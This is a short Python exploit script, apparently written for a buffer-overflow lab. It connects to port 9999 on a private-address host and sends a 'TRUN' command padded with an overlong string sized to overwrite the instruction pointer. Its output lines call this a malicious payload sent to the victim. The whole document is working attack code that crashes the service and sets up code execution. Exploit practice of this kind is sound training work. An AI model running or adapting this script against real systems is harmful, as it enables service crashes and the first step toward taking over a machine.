#!/usr/bin/python
import socket

victim_host = "10.0.2.4"
port = 9999

payload = "A" * 2003  # calculated buffer
payload += "B" * 4 # control EIP with 4 B's , translated into 42 in hex
payload += "C" * 500

buffer_exploit = "TRUN /.:/" + payload 


# socket connection to the program's port
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)

print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()
